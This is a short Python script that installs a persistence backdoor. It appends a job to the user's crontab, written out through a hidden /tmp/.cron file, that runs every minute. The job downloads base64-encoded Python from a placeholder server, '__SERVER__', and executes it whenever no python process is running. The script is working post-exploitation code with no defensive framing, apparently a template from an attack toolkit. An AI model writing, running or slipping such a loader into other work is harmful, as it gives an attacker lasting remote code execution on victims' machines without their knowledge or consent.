#!/usr/bin/python

from random import randint
import os

newcron = "/tmp/.cron"
cmd = "pgrep python || python -c 'import base64, urllib2; exec( compile( base64.b64decode( urllib2.urlopen( \"__SERVER__\" ).read() ), \"\", \"exec\" ) )'"
tab = "*/1 * * * * {}\n".format( cmd )
crons = [ x for x in os.popen( "crontab -l" ) ]
crons.append( tab )
with open( newcron, "w" ) as f:
    for cron in crons:
        f.write( "{}".format( cron ) )
f.close()
os.system( "crontab {}".format( newcron ) )
